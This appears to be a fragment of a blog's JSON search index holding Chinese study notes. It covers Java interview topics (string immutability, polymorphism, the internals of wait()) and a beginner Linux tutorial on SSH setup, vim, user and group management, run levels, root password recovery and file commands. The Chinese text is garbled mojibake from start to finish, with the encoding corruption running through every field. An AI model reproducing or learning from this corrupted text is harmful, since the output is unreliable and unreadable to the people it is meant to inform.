ä¸ºå­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œæ‰€ä»¥æ˜¯å¤šçº¿ç¨‹å®‰å…¨çš„ï¼ŒåŒä¸€ä¸ªå­—ç¬¦ä¸²å®ä¾‹å¯ä»¥è¢«å¤šä¸ªçº¿ç¨‹å…±äº«ï¼Œè¿™æ ·ä¾¿ä¸ç”¨å› ä¸ºçº¿ç¨‹å®‰å…¨é—®é¢˜è€Œä½¿ç”¨åŒæ­¥ï¼Œå­—ç¬¦ä¸²è‡ªå·±ä¾¿æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼›å› ä¸ºå­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„æ‰€ä»¥åœ¨å®ƒåˆ›å»ºçš„æ—¶å€™ hashcode å°±è¢«ç¼“å­˜äº†ï¼Œä¸å˜æ€§ä¹Ÿä¿è¯äº† hash ç çš„å”¯ä¸€æ€§ï¼Œä¸éœ€è¦é‡æ–°è®¡ç®—ï¼Œè¿™å°±ä½¿å¾—å­—ç¬¦ä¸²å¾ˆé€‚åˆä½œä¸º Map çš„é”®ï¼Œå­—ç¬¦ä¸²çš„å¤„ç†é€Ÿåº¦è¦å¿«è¿‡å…¶å®ƒçš„é”®å¯¹è±¡ï¼Œè¿™å°±æ˜¯ HashMap ä¸­çš„é”®å¾€å¾€éƒ½ä½¿ç”¨å­—ç¬¦ä¸²çš„åŸå› ã€‚ è¯·è®²è®²Javaæœ‰å“ªäº›ç‰¹æ€§ï¼Œå¹¶ä¸¾ä¸€ä¸ªå’Œå¤šæ€æœ‰å…³çš„ä¾‹å­ã€‚ å°è£…ã€ç»§æ‰¿ã€å¤šæ€ã€‚å¤šæ€ï¼šæŒ‡å…è®¸ä¸åŒç±»çš„å¯¹è±¡å¯¹åŒä¸€æ¶ˆæ¯åšå‡ºå“åº”ã€‚å³åŒä¸€æ¶ˆæ¯å¯ä»¥æ ¹æ®å‘é€å¯¹è±¡çš„ä¸åŒè€Œé‡‡ç”¨å¤šç§ä¸åŒçš„è¡Œä¸ºæ–¹å¼ã€‚ï¼ˆå‘é€æ¶ˆæ¯å°±æ˜¯å‡½æ•°è°ƒç”¨ï¼‰ è¯·ä½ è®²è®²waitæ–¹æ³•çš„åº•å±‚åŸç†ObjectSynchronizer::waitæ–¹æ³•é€šè¿‡objectçš„å¯¹è±¡ä¸­æ‰¾åˆ°ObjectMonitorå¯¹è±¡è°ƒç”¨æ–¹æ³• void ObjectMonitor::wait(jlong millis, bool interruptible, TRAPS) é€šè¿‡ObjectMonitor::AddWaiterè°ƒç”¨æŠŠæ–°å»ºç«‹çš„ObjectWaiterå¯¹è±¡æ”¾å…¥åˆ° _WaitSet çš„é˜Ÿåˆ—çš„æœ«å°¾ä¸­ç„¶ååœ¨ObjectMonitor::exité‡Šæ”¾é”ï¼Œæ¥ç€ thread_ParkEvent-&gt;park ä¹Ÿå°±æ˜¯waitã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Linux","slug":"Linux","date":"2020-07-02T05:26:15.000Z","updated":"2021-04-11T17:11:28.299Z","comments":true,"path":"Linux/","link":"","permalink":"https://blog.kayleh.top/Linux/","excerpt":"è™šæ‹Ÿæœº","text":"è™šæ‹Ÿæœº ä¸‹è½½ä¸­æ–‡æ”¯æŒ 1593837102375 ç½‘ç»œè¿æ¥çš„ä¸‰ç§å½¢å¼ æ¡¥è¿æ¥ï¼šLinuxå¯ä»¥å’Œå…¶ä»–ç³»ç»Ÿé€šä¿¡ï¼Œä½†æ˜¯ä¼šé€ æˆIPå†²çª NATï¼šç½‘ç»œåœ°å€è½¬æ¢æ–¹å¼ï¼ŒLinuxå¯ä»¥è®¿é—®å¤–ç½‘ï¼Œä¸ä¼šé€ æˆIPå†²çª ä¸»æœºæ¨¡å¼ï¼šä½ çš„Linuxæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä¸»æœºï¼Œä¸èƒ½è®¿é—®å¤–ç½‘ åˆ†åŒºï¼š bootåˆ†åŒºï¼š200M swapåˆ†åŒºï¼šäº¤æ¢åˆ†åŒºï¼Œè™šæ‹Ÿå†…å­˜ï¼Œæ²¡æœ‰æŒ‚è½½ç‚¹ï¼Œ2048M æ ¹åˆ†åŒº/ï¼šä½¿ç”¨å…¨éƒ¨å‰©ä½™ç©ºé—´ å®‰è£…VMToolå¤åˆ¶åˆ°/optä¸‹ tar -zxvf VMâ€¦â€¦ .tar.gz è§£å‹,è¿›å»æ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œ /vmware-install.pl è®¾ç½®å…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨/mnt/hgfsä¸‹ Linuxæ–‡ä»¶ç³»ç»Ÿé‡‡ç”¨çš„æ˜¯çº§å±‚å¼çš„æ ‘çŠ¶ç»“æ„ï¼Œæœ€ä¸Šå±‚çš„æ˜¯æ ¹ç›®å½•â€œ/â€ã€‚ /bin æ˜¯Binaryçš„ç¼©å†™ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾ç€æœ€ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤ /dev ç®¡ç†è®¾å¤‡ /etcç®¡ç†é…ç½®æ–‡ä»¶ /home å­˜æ”¾æ™®é€šç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œåœ¨Linuxä¸­æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œä¸€èˆ¬è¯¥ç›®å½•åæ˜¯ä»¥ç”¨æˆ·çš„è´¦å·å‘½åçš„ /lib ç³»ç»Ÿå¼€æœºéœ€è¦ /media dvdç›¸å…³ /mnt æŒ‚è½½æ–‡ä»¶å¤¹ /opt å®‰è£…çš„è½¯ä»¶ /proc å†…æ ¸ /root ç³»ç»Ÿç®¡ç†å‘˜ï¼Œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½• /sbin Super userç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„ç³»ç»Ÿç®¡ç†ç¨‹åº /selinux å®‰å…¨åŠ å¼º /sys ç³»ç»Ÿ /tmp ä¸´æ—¶æ–‡ä»¶ /usr ç”¨æˆ·ï¼Œå®‰è£…çš„ç¨‹åº /var å˜é‡ï¼Œæ—¥å¿— è¿œç¨‹ç™»é™†XShell éœ€è¦Linuxå¼€å¯ä¸€ä¸ªsshdæœåŠ¡22 ç»ˆç«¯æ‰“å¼€setupï¼Œæ‰“å¼€ç³»ç»ŸæœåŠ¡ï¼Œæ‰¾åˆ°sshdï¼Œç©ºæ ¼é”®æ‰“å¼€æœåŠ¡ã€‚tabé”®é€€å‡ºã€‚ è¯¥æœåŠ¡ä¼šç›‘å¬22ç«¯å£ã€‚ ubuntuæ–¹æ³•ï¼š å…ˆè¯•ç€å¼€å¯SSHæœåŠ¡ åœ¨ä½¿ç”¨SSHä¹‹å‰ï¼Œå¯ä»¥å…ˆæ£€æŸ¥SSHæœåŠ¡æœ‰æ²¡æœ‰å¼€å¯ã€‚ä½¿ç”¨å‘½ä»¤ï¼šsudo ps -e | grep sshæ¥æŸ¥çœ‹ï¼Œå¦‚æœè¿”å›çš„ç»“æœæ˜¯â€œxxxx? 00:00:00 sshdâ€,ä»£è¡¨æœåŠ¡å¼€å¯ã€‚é‚£ä¸ªå››ä¸ªxä»£è¡¨å››ä½æ•°å­—ï¼Œæ¯å°æœºæ•°å­—ä¸ä¸€æ ·çš„ï¼Œå¦‚å›¾ï¼š img å¦‚æœæ²¡æœ‰ååº”æˆ–è€…å…¶ä»–ç»“æœï¼Œå†è¯•ç€å¼€å¯SSHæœåŠ¡ã€‚ä½¿ç”¨å‘½ä»¤sudo /etc/init.d/ssh startæ¥å¼€å¯æœåŠ¡ï¼Œå¦‚å›¾ï¼š img å¦‚æœæ˜¯å›¾ä¸­ç»“æœï¼Œè¯´æ˜æ²¡æœ‰å®‰è£…SSHæœåŠ¡ï¼Œæ­¤æ—¶éœ€è¦å®‰è£… SSHæœåŠ¡ï¼Œä¸ºäº†èƒ½æé«˜å®‰è£…æˆåŠŸç‡ï¼Œå»ºè®®å…ˆæ›´æ–°æºï¼šsudo apt-get updateæ›´æ–°å®‰è£…æºï¼Œå¦‚å›¾ï¼š img ç„¶åå®‰è£…SSHæœåŠ¡ï¼Œä½¿ç”¨å‘½ä»¤ï¼šsudo apt-get install openssh-serverã€‚å¦‚å›¾ï¼š img ç­‰å¾…å®‰è£…ç»“æŸå³å¯ã€‚ç„¶åå†æ¬¡æŸ¥çœ‹æœåŠ¡æœ‰æ²¡æœ‰å¯åŠ¨ï¼šsudo ps -e | grep sshï¼š æœ‰sshdé‚£ä¸ªä¸œè¥¿ï¼Œè¯´æ˜æœåŠ¡å¯åŠ¨äº†ï¼Œå¦‚æœéœ€è¦å†æ¬¡ç¡®è®¤æˆ–è€…æ²¡æœ‰å›¾ä¸­çš„ç»“æœï¼Œä½¿ç”¨å‘½ä»¤æ¥å¯åŠ¨:sudo /etc/init.d/ssh start: img çœ‹åˆ°æœåŠ¡startingäº†ï¼ŒæœåŠ¡æˆåŠŸå¼€å¯ã€‚å¦å¤–ï¼Œè¿˜æœ‰å‡ æ¡å‘½ä»¤éœ€è¦è®°ä½ï¼š sudo service ssh status æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼š img sudo service ssh stop å…³é—­æœåŠ¡ï¼š sudo service ssh restart é‡å¯æœåŠ¡ Xshellæ–°å»ºä¼šè¯ï¼Œå…ˆæŸ¥çœ‹linuxçš„ipåœ°å€ã€‚ ipconfig 1593769665771 ç®­å¤´æŒ‡å‘çš„æ˜¯ipåœ°å€ã€‚ å¡«å†™åˆ°xshell 1593769808715 Ubuntuéœ€è¦é…ç½®sshdæœåŠ¡ è¾“å…¥Linuxçš„ç”¨æˆ·åå’Œå¯†ç ã€‚æˆåŠŸè¿æ¥ã€‚ å¦‚æœè¿œç¨‹ä½¿ç”¨å‘½ä»¤ï¼š reboot æœåŠ¡å™¨ä¹Ÿä¼šé‡å¯ æ–‡ä»¶çš„ä¸Šä¼ ä¸‹è½½XFTPåè®®é€‰æ‹©SFTP ç«¯å£å·é€‰æ‹©22 1593782048647 ä¹±ç è§£å†³ï¼š é€‰æ‹©è¦ä¼ è¾“çš„æ–‡ä»¶ï¼Œå³é”®ä¼ è¾“å°±å¯ä»¥äº†ã€‚ Viå’ŒVimç¼–è¾‘å™¨ æ­£å¸¸æ¨¡å¼åœ¨æ­£å¸¸æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¿«æ·é”®ã€‚ ä»¥ vim æ‰“å¼€ä¸€ä¸ªæ¡£æ¡ˆå°±ç›´æ¥è¿›å…¥ä¸€èˆ¬æ¨¡å¼äº†(è¿™æ˜¯é»˜è®¤çš„æ¨¡å¼)ã€‚åœ¨è¿™ä¸ªæ¨¡å¼ä¸­ï¼Œ ä½ å¯ä»¥ä½¿ç”¨ã€ä¸Šä¸‹å·¦å³ã€æŒ‰é”®æ¥ç§»åŠ¨å…‰æ ‡ï¼Œä½ å¯ä»¥ä½¿ç”¨ã€åˆ é™¤å­—ç¬¦ã€æˆ–ã€åˆ é™¤æ•´è¡Œã€æ¥å¤„ç†æ¡£æ¡ˆå†…å®¹ï¼Œ ä¹Ÿå¯ä»¥ä½¿ç”¨ã€å¤åˆ¶ã€è´´ä¸Šã€æ¥å¤„ç†ä½ çš„æ–‡ä»¶æ•°æ®ã€‚ æ’å…¥æ¨¡å¼/ç¼–è¾‘æ¨¡å¼åœ¨æ¨¡å¼ä¸‹ï¼Œç¨‹åºå‘˜å¯ä»¥è¾“å…¥å†…å®¹ã€‚ æŒ‰ä¸‹ i, I ç­‰ä»»ä½•ä¸€ä¸ªå­—æ¯ä¹‹åæ‰ä¼šè¿›å…¥ç¼–è¾‘æ¨¡å¼, ä¸€èˆ¬æ¥è¯´æŒ‰ i å³å¯ å‘½ä»¤è¡Œæ¨¡å¼åœ¨è¿™ä¸ªæ¨¡å¼å½“ä¸­ï¼Œ å¯ä»¥æä¾›ä½ ç›¸å…³æŒ‡ä»¤ï¼Œå®Œæˆè¯»å–ã€å­˜ç›˜ã€æ›¿æ¢ã€ç¦»å¼€ vim ã€æ˜¾ç¤ºè¡Œå·ç­‰çš„åŠ¨ä½œåˆ™æ˜¯åœ¨æ­¤æ¨¡å¼ä¸­è¾¾æˆçš„ï¼ å„æ¨¡å¼ä¹‹é—´çš„äº’ç›¸è½¬æ¢1593783036444 å¿«æ·é”®çš„ä½¿ç”¨æ¡ˆä¾‹1) æ‹·è´å½“å‰è¡Œ yy , æ‹·è´å½“å‰è¡Œå‘ä¸‹çš„ 5 è¡Œ 5yyï¼Œå¹¶ç²˜è´´ï¼ˆpï¼‰ã€‚ 2) åˆ é™¤å½“å‰è¡Œ dd , åˆ é™¤å½“å‰è¡Œå‘ä¸‹çš„ 5 è¡Œ 5dd 3) åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾æŸä¸ªå•è¯ [å‘½ä»¤è¡Œä¸‹ /å…³é”®å­— ï¼Œ å›è½¦ æŸ¥æ‰¾ , è¾“å…¥ n å°±æ˜¯æŸ¥æ‰¾ä¸‹ä¸€ä¸ª ],æŸ¥è¯¢ hello. 4) è®¾ç½®æ–‡ä»¶çš„è¡Œå·ï¼Œå–æ¶ˆæ–‡ä»¶çš„è¡Œå·.[å‘½ä»¤è¡Œä¸‹ : set nu å’Œ :set nonu] 5) ç¼–è¾‘ /etc/profile æ–‡ä»¶ï¼Œä½¿ç”¨å¿«æ·é”®åˆ°åº•æ–‡æ¡£çš„æœ€æœ«è¡Œ[G]å’Œæœ€é¦–è¡Œ[gg],æ³¨æ„è¿™äº›éƒ½æ˜¯åœ¨æ­£å¸¸æ¨¡å¼ä¸‹æ‰§è¡Œçš„ã€‚ 6) åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­è¾“å…¥ â€œhelloâ€ ,ç„¶ååˆæ’¤é”€è¿™ä¸ªåŠ¨ä½œï¼Œå†æ­£å¸¸æ¨¡å¼ä¸‹è¾“å…¥ u 7) ç¼–è¾‘ /etc/profile æ–‡ä»¶ï¼Œå¹¶å°†å…‰æ ‡ç§»åŠ¨åˆ° ç¬¬ 20 è¡Œ shift+g ç¬¬ä¸€æ­¥ï¼šæ˜¾ç¤ºè¡Œå· :set nu ç¬¬äºŒæ­¥ï¼šè¾“å…¥ 20 è¿™ä¸ªæ•° ç¬¬ä¸‰æ­¥: è¾“å…¥ shift+g å…³æœº&amp;é‡å¯å‘½ä»¤åŸºæœ¬ä»‹ç»shutdown shutdown -h now : è¡¨ç¤ºç«‹å³å…³æœº shutdown -h 1 : è¡¨ç¤º 1 åˆ†é’Ÿåå…³æœº shutdown -r now: ç«‹å³é‡å¯ halt å°±æ˜¯ç›´æ¥ä½¿ç”¨ï¼Œæ•ˆæœç­‰ä»·äºå…³æœº reboot å°±æ˜¯é‡å¯ç³»ç»Ÿã€‚ syncï¼š æŠŠå†…å­˜çš„æ•°æ®åŒæ­¥åˆ°ç£ç›˜ æ³¨æ„ç»†èŠ‚å½“æˆ‘ä»¬å…³æœºæˆ–è€…é‡å¯æ—¶ï¼Œéƒ½åº”è¯¥å…ˆæ‰§è¡Œä»¥ä¸‹ sync æŒ‡ä»¤ï¼ŒæŠŠå†…å­˜çš„æ•°æ®å†™å…¥ç£ç›˜ï¼Œé˜²æ­¢æ•°æ®ä¸¢å¤±ã€‚ ç”¨æˆ·ç™»å½•å’Œæ³¨é”€1) ç™»å½•æ—¶å°½é‡å°‘ç”¨ root å¸å·ç™»å½•ï¼Œå› ä¸ºå®ƒæ˜¯ç³»ç»Ÿç®¡ç†å‘˜ï¼Œæœ€å¤§çš„æƒé™ï¼Œé¿å…æ“ä½œå¤±è¯¯ã€‚å¯ä»¥åˆ©ç”¨æ™®é€šç”¨æˆ·ç™»å½•ï¼Œç™»å½•åå†ç”¨â€su - ç”¨æˆ·åâ€™å‘½ä»¤æ¥åˆ‡æ¢æˆç³»ç»Ÿç®¡ç†å‘˜èº«ä»½. 2) åœ¨æç¤ºç¬¦ä¸‹è¾“å…¥ logout å³å¯æ³¨é”€ç”¨æˆ· ä½¿ç”¨ç»†èŠ‚1)logout æ³¨é”€æŒ‡ä»¤åœ¨å›¾å½¢è¿è¡Œçº§åˆ«æ— æ•ˆï¼Œåœ¨ è¿è¡Œçº§åˆ« 3 ä¸‹æœ‰æ•ˆ. ç”¨æˆ·ç®¡ç† è¯´æ˜ Linux ç³»ç»Ÿæ˜¯ä¸€ä¸ªå¤šç”¨æˆ·å¤šä»»åŠ¡çš„æ“ä½œç³»ç»Ÿï¼Œä»»ä½•ä¸€ä¸ªè¦ä½¿ç”¨ç³»ç»Ÿèµ„æºçš„ç”¨æˆ·ï¼Œéƒ½å¿…é¡»é¦–å…ˆå‘ç³»ç»Ÿç®¡ç†å‘˜ç”³è¯·ä¸€ä¸ªè´¦å· æ·»åŠ ç”¨æˆ·åŸºæœ¬è¯­æ³•useradd [é€‰é¡¹] ç”¨æˆ·å 1) å½“åˆ›å»ºç”¨æˆ·æˆåŠŸåï¼Œä¼šè‡ªåŠ¨çš„åˆ›å»ºå’Œç”¨æˆ·åŒåçš„å®¶ç›®å½• 2) ä¹Ÿå¯ä»¥é€šè¿‡ useradd -d æŒ‡å®šç›®å½• æ–°çš„ç”¨æˆ·åï¼Œç»™æ–°åˆ›å»ºçš„ç”¨æˆ·æŒ‡å®šå®¶ç›®å½• è®¾ç½®å¯†ç åŸºæœ¬è¯­æ³• passwd ç”¨æˆ·å åˆ é™¤ç”¨æˆ·åŸºæœ¬è¯­æ³•userdel ç”¨æˆ·å 1) åˆ é™¤ç”¨æˆ· xmï¼Œä½†æ˜¯è¦ä¿ç•™å®¶ç›®å½• userdel xm 2) åˆ é™¤ç”¨æˆ· xh ä»¥åŠç”¨æˆ·ä¸»ç›®å½• userdel xh -r åœ¨åˆ é™¤ç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ä¼šå°†å®¶ç›®å½•åˆ é™¤ã€‚ æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯åŸºæœ¬è¯­æ³•id ç”¨æˆ·å uid=0(root) gid=0(root) ç»„=0(root) | | | V V V ç”¨æˆ·idå· æ‰€åœ¨ç»„çš„idå· ç»„å åˆ‡æ¢ç”¨æˆ·åœ¨æ“ä½œ Linux ä¸­ï¼Œå¦‚æœå½“å‰ç”¨æˆ·çš„æƒé™ä¸å¤Ÿï¼Œå¯ä»¥é€šè¿‡ su - æŒ‡ä»¤ï¼Œåˆ‡æ¢åˆ°é«˜æƒé™ç”¨æˆ·ï¼Œæ¯”å¦‚ root åŸºæœ¬è¯­æ³• su â€“ åˆ‡æ¢ç”¨æˆ·å //é«˜æƒé™ç”¨æˆ·å‘ä½æƒé™ç”¨æˆ·ä¸éœ€è¦å¯†ç  exit //å¯ä»¥å›åˆ°åŸæ¥çš„ç”¨æˆ· 1)ä»æƒé™é«˜çš„ç”¨æˆ·åˆ‡æ¢åˆ°æƒé™ä½çš„ç”¨æˆ·ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç ï¼Œåä¹‹éœ€è¦ã€‚ 2)å½“éœ€è¦è¿”å›åˆ°åŸæ¥ç”¨æˆ·æ—¶ï¼Œä½¿ç”¨ exit æŒ‡ä»¤ whoami //æŸ¥çœ‹å½“å‰ç”¨æˆ· ç”¨æˆ·ç»„ç±»ä¼¼äºè§’è‰²ï¼Œç³»ç»Ÿå¯ä»¥å¯¹æœ‰å…±æ€§çš„å¤šä¸ªç”¨æˆ·è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†ã€‚ å¢åŠ ç»„ groupadd ç»„ å åˆ é™¤ç»„ groupdel ç»„ å å¢åŠ ç”¨æˆ·æ—¶ç›´æ¥åŠ ä¸Šç»„ useradd -g ç”¨æˆ·ç»„ ç”¨æˆ·å ä¿®æ”¹ç”¨æˆ·çš„ç»„ usermod -g ç”¨æˆ·ç»„ ç”¨æˆ·å ç”¨æˆ·å’Œç»„çš„ç›¸å…³æ–‡ä»¶/etc/passwd æ–‡ä»¶ ç”¨æˆ·ï¼ˆuserï¼‰çš„é…ç½®æ–‡ä»¶ï¼Œè®°å½•ç”¨æˆ·çš„å„ç§ä¿¡æ¯ æ¯è¡Œçš„å«ä¹‰ï¼š ç”¨æˆ·å : å£ä»¤ : ç”¨æˆ·æ ‡è¯†å· : ç»„æ ‡è¯†å· : æ³¨é‡Šæ€§æè¿° : ä¸»ç›®å½• : ç™»å½• Shell /etc/shadow æ–‡ä»¶ å£ä»¤çš„é…ç½®æ–‡ä»¶æ¯è¡Œçš„å«ä¹‰ï¼š ç™»å½•å : åŠ å¯†å£ä»¤ : æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ : æœ€å°æ—¶é—´é—´éš” : æœ€å¤§æ—¶é—´é—´éš” : è­¦å‘Šæ—¶é—´ : ä¸æ´»åŠ¨æ—¶é—´ : å¤±æ•ˆæ—¶é—´ : æ ‡å¿— /etc/group æ–‡ä»¶ç»„(group)çš„é…ç½®æ–‡ä»¶ï¼Œè®°å½• Linux åŒ…å«çš„ç»„çš„ä¿¡æ¯æ¯è¡Œå«ä¹‰ï¼š ç»„å:å£ä»¤:ç»„æ ‡è¯†å·:ç»„å†…ç”¨æˆ·åˆ—è¡¨ è¿è¡Œçº§åˆ«è¿è¡Œçº§åˆ«è¯´æ˜ï¼š0ï¼šå…³æœº1ï¼šå•ç”¨æˆ·ã€æ‰¾å›ä¸¢å¤±å¯†ç ã€‘2ï¼šå¤šç”¨æˆ·çŠ¶æ€æ²¡æœ‰ç½‘ç»œæœåŠ¡3ï¼šå¤šç”¨æˆ·çŠ¶æ€æœ‰ç½‘ç»œæœåŠ¡4ï¼šç³»ç»Ÿæœªä½¿ç”¨ä¿ç•™ç»™ç”¨æˆ·5ï¼šå›¾å½¢ç•Œé¢6ï¼šç³»ç»Ÿé‡å¯ å¸¸ç”¨è¿è¡Œçº§åˆ«æ˜¯ 3 å’Œ 5 ï¼Œè¦ä¿®æ”¹é»˜è®¤çš„è¿è¡Œçº§åˆ«å¯æ”¹æ–‡ä»¶ /etc/inittab çš„ id:5:initdefault: è¿™ä¸€è¡Œä¸­çš„æ•°å­— 1593838451860 æŒ‡å®šè¿è¡Œçº§åˆ«img init [012356] int 3 init [012356] å¦‚ä½•æ‰¾å› root å¯†ç è¿›å…¥åˆ° å•ç”¨æˆ·æ¨¡å¼ï¼Œç„¶åä¿®æ”¹ root å¯†ç ã€‚å› ä¸ºè¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œroot ä¸éœ€è¦å¯†ç å°±å¯ä»¥ç™»å½•ã€‚ å¼€æœºåœ¨å¼•å¯¼æœŸé—´ä½¿ç”¨enterè¿›å…¥é¡µé¢ï¼ŒæŒ‰eè¿›å…¥é€‰æ‹©ç¬¬äºŒè¡Œçš„å†…æ ¸kenralå†æŒ‰eè¿›å…¥ï¼Œè¾“å…¥1å‘Šè¯‰å†…æ ¸è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œå†æŒ‰å›è½¦å›å»ä¸Šä¸€çº§æŒ‰bå¯åŠ¨ã€‚ å¯åŠ¨åä½¿ç”¨passwd rootå°±å¯ä»¥é‡ç½®å¯†ç äº†ã€‚rebooté‡å¯ã€‚ è·å¾—å¸®åŠ©ä¿¡æ¯manman [å‘½ä»¤æˆ–é…ç½®æ–‡ä»¶]ï¼ˆåŠŸèƒ½æè¿°ï¼šè·å¾—å¸®åŠ©ä¿¡æ¯ï¼‰ man ls help æŒ‡ä»¤help å‘½ä»¤ ï¼ˆåŠŸèƒ½æè¿°ï¼šè·å¾— shell å†…ç½®å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ï¼‰ help cd æ–‡ä»¶ç›®å½•ç±»pwd æŒ‡ä»¤pwd (åŠŸèƒ½æè¿°ï¼šæ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„) ls æŒ‡ä»¤ls [ é€‰ é¡¹] [ç›®å½•æˆ–æ˜¯æ–‡ä»¶] cd æŒ‡ä»¤cd .å½“å‰ç›®å½•(ä¸å˜) cd [å‚æ•°] (åŠŸèƒ½æè¿°ï¼šåˆ‡æ¢åˆ°æŒ‡å®šç›®å½•) cd ~ æˆ–è€… cd ï¼šå›åˆ°è‡ªå·±çš„å®¶ç›®å½• cd .. å›åˆ°å½“å‰ç›®å½•çš„ä¸Šä¸€çº§ç›®å½• cd /root ä½¿ç”¨ç»å¯¹è·¯å¾„åˆ‡æ¢åˆ° root ç›®å½• cd ../../root ä½¿ç”¨ç›¸å¯¹è·¯å¾„åˆ°/root ç›®å½• mkdir æŒ‡ä»¤mkdir æŒ‡ä»¤ç”¨äºåˆ›å»ºç›®å½•(make directory) mkdir [é€‰é¡¹] è¦åˆ›å»ºçš„ç›®å½• -p ï¼šåˆ›å»ºå¤šçº§ç›®å½• mkdir -p /aaa/bbb/ccc rmdir æŒ‡ä»¤rmdir æŒ‡ä»¤åˆ é™¤ç©ºç›®å½• rmdir [é€‰é¡¹] è¦åˆ é™¤çš„ç©ºç›®å½• rmdiråˆ é™¤çš„æ˜¯ç©ºç›®å½•ï¼Œå¦‚æœç›®å½•ä¸‹æœ‰å†…å®¹æ—¶æ— æ³•åˆ é™¤çš„ã€‚æç¤ºï¼šå¦‚æœéœ€è¦åˆ é™¤éç©ºç›®å½•ï¼Œéœ€è¦ä½¿ç”¨rm -rfè¦åˆ é™¤çš„ç›®å½• touch æŒ‡ä»¤touch æŒ‡ä»¤åˆ›å»ºç©ºæ–‡ä»¶ touch æ–‡ä»¶åç§° cp æŒ‡ä»¤[*]cp æŒ‡ä»¤æ‹·è´æ–‡ä»¶åˆ°æŒ‡å®šç›®å½• cp [é€‰é¡¹] source dest -r ï¼šé€’å½’å¤åˆ¶æ•´ä¸ªæ–‡ä»¶å¤¹ cp -r æºç›®å½• ç›®æ ‡ç›®å½• rm æŒ‡ä»¤rm æŒ‡ä»¤ç§»é™¤ã€åˆ é™¤ã€‘æ–‡ä»¶æˆ–ç›®å½• rm [é€‰é¡¹] è¦åˆ é™¤çš„æ–‡ä»¶æˆ–ç›®å½• -r ï¼šé€’å½’åˆ é™¤æ•´ä¸ªæ–‡ä»¶å¤¹ -f ï¼š å¼ºåˆ¶åˆ é™¤ä¸æç¤º mv æŒ‡ä»¤mv ç§»åŠ¨æ–‡ä»¶ä¸ç›®å½•æˆ–é‡å‘½å mv oldNameFile newNameFile (åŠŸèƒ½æè¿°ï¼šé‡å‘½å) mv /temp/movefile /targetFolder (åŠŸèƒ½æè¿°ï¼šç§»åŠ¨æ–‡ä»¶) cat æŒ‡ä»¤cat æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ˜¯ä»¥åªè¯»çš„æ–¹å¼æ‰“å¼€ã€‚ cat [é€‰é¡¹] è¦æŸ¥çœ‹çš„æ–‡ä»¶ -n ï¼šæ˜¾ç¤ºè¡Œå· cat åªèƒ½æµè§ˆæ–‡ä»¶ï¼Œè€Œä¸èƒ½ä¿®æ”¹æ–‡ä»¶ï¼Œä¸ºäº†æµè§ˆæ–¹ä¾¿ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸Š ç®¡é“å‘½ä»¤ | more cat æ–‡ä»¶å | more [åˆ†é¡µæµè§ˆ] more æŒ‡ä»¤more æŒ‡ä»¤æ˜¯ä¸€ä¸ªåŸºäº VI ç¼–è¾‘å™¨çš„æ–‡æœ¬è¿‡æ»¤å™¨ï¼Œå®ƒä»¥å…¨å±å¹•çš„æ–¹å¼æŒ‰é¡µæ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ å¿«æ·é”®ï¼š 1593843318484 less æŒ‡ä»¤less æŒ‡ä»¤ç”¨æ¥åˆ†å±æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå®ƒçš„åŠŸèƒ½ä¸ more æŒ‡ä»¤ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æŒ‡ä»¤æ›´åŠ å¼ºå¤§ï¼Œæ”¯æŒå„ç§æ˜¾ç¤ºç»ˆç«¯ã€‚less æŒ‡ä»¤åœ¨æ˜¾ç¤ºæ–‡ä»¶å†…å®¹æ—¶ï¼Œå¹¶ä¸æ˜¯ä¸€æ¬¡å°†æ•´ä¸ªæ–‡ä»¶åŠ è½½ä¹‹åæ‰æ˜¾ç¤ºï¼Œè€Œæ˜¯æ ¹æ®æ˜¾ç¤ºéœ€è¦åŠ è½½å†…å®¹ï¼Œå¯¹äºæ˜¾ç¤ºå¤§å‹æ–‡ä»¶å…·æœ‰è¾ƒé«˜çš„æ•ˆç‡ã€‚ less è¦æŸ¥çœ‹çš„æ–‡ä»¶ 1593843382522 &gt; æŒ‡ä»¤ å’Œ &gt;&gt; æŒ‡ä»¤> è¾“å‡ºé‡å®šå‘ : ä¼šå°†åŸæ¥çš„æ–‡ä»¶çš„å†…å®¹è¦†ç›– >&gt; è¿½åŠ ï¼š ä¸ä¼šè¦†ç›–åŸæ¥æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œæ˜¯è¿½åŠ åˆ°æ–‡ä»¶çš„å°¾éƒ¨ã€‚ ls -l &gt;æ–‡ä»¶ ï¼ˆåŠŸèƒ½æè¿°ï¼šåˆ—è¡¨çš„å†…å®¹å†™å…¥æ–‡ä»¶ a.txt ä¸­ï¼ˆè¦†ç›–å†™ï¼‰ï¼‰ ls -al &gt;&gt;æ–‡ä»¶ 